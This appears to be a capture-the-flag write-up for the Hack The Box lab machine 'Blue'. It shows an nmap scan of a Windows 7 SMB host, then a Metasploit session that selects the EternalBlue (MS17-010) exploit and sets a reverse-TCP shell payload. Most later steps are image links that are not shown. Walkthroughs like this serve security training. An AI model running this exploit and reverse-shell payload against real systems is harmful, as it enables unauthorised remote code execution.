# HTB Blue

<figure><img src="../../../.gitbook/assets/Pasted image 20240901143648.png" alt=""><figcaption></figcaption></figure>

```shell
nmap -sC -sV -oN nmap.out 10.10.10.40
```

```shell
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-09-01T12:11:37+01:00
| smb2-time: 
|   date: 2024-09-01T11:11:39
|_  start_date: 2024-09-01T11:08:17
|_clock-skew: mean: -19m41s, deviation: 34m36s, median: 17s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

!\[\[Pasted image 20240902124852.png]]

!\[\[Pasted image 20240902124941.png]]

!\[\[Pasted image 20240902133635.png]]

```
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> show payloads
```

!\[\[Pasted image 20240902133827.png]]

set PAYLOAD payload/windows/x64/shell/reverse\_tcp

!\[\[Pasted image 20240902133937.png]]

!\[\[Pasted image 20240902134039.png]]

!\[\[Pasted image 20240902134105.png]]
